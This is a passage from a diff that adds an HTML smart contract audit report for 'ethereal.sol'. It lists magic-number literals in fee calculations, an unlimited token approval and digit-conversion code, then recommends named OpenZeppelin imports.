+<pre class="hljs"><code><div>        uint256 redeemFee = (metadata[_tokenId].balance * gems[metadata[_tokenId].gem].redeemFee) / 1e4;
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L189">Line: 189</a></p>
+<pre class="hljs"><code><div>        uint256 redeemFee = metadata[_tokenId].balance * gems[metadata[_tokenId].gem].redeemFee / 1e4;
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L268">Line: 268</a></p>
+<pre class="hljs"><code><div>        IwstETH(wstETH).approve(_spender, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L286">Line: 286</a></p>
+<pre class="hljs"><code><div>            temp /= 10;
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L290">Line: 290</a></p>
+<pre class="hljs"><code><div>            digits -= 1;
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L291">Line: 291</a></p>
+<pre class="hljs"><code><div>            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L292">Line: 292</a></p>
+<pre class="hljs"><code><div>            value /= 10;
+</div></code></pre>
+</li>
+</ul>
+</details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Use CONSTANT_VARIABLES instead of literals.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="informational-observations">Informational Observations</h3>
+<ul>
+<li><strong>Named Imports</strong>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>It's a best practice to use named imports:</li>
+</ul>
+<pre class="hljs"><code><div>    import &quot;openzeppelin-contracts/access/Ownable.sol&quot;;
+    import &quot;openzeppelin-contracts/utils/Pausable.sol&quot;;
+    import &quot;openzeppelin-contracts/token/ERC721/extensions/ERC721URIStorage.sol&quot;;
+    import &quot;openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol&quot;;
+    import &quot;openzeppelin-contracts/utils/ReentrancyGuard.sol&quot;;
+</div></code></pre>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<pre class="hljs"><code><div>
+<span class="hljs-deletion">-   import "openzeppelin-contracts/access/Ownable.sol";</span>
+<span class="hljs-addition">+   import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";</span>
+<span class="hljs-deletion">-   import "openzeppelin-contracts/utils/Pausable.sol";</span>
+<span class="hljs-addition">+   import {Pausable} from "openzeppelin-contracts/utils/Pausable.sol";</span>
+<span class="hljs-deletion">-   import "openzeppelin-contracts/token/ERC721/extensions/ERC721URIStorage.sol";</span>
+<span class="hljs-addition">+   import {ERC721URIStorage} from "openzeppelin-contracts/token/ERC721/extensions/ERC721URIStorage.sol";</span>
+<span class="hljs-deletion">-   import "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";</span>
+<span class="hljs-addition">+   import {ERC721Holder} from "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";</span>
+<span class="hljs-deletion">-   import "openzeppelin-contracts/utils/ReentrancyGuard.sol";</span>
+<span class="hljs-addition">+   import {ReentrancyGuard} from "openzeppelin-contracts/utils/ReentrancyGuard.sol";</span>
+
+</div></code></pre>
+</li>
+</ul>
+</li>
+</ul>
+
+</body>
+</html>
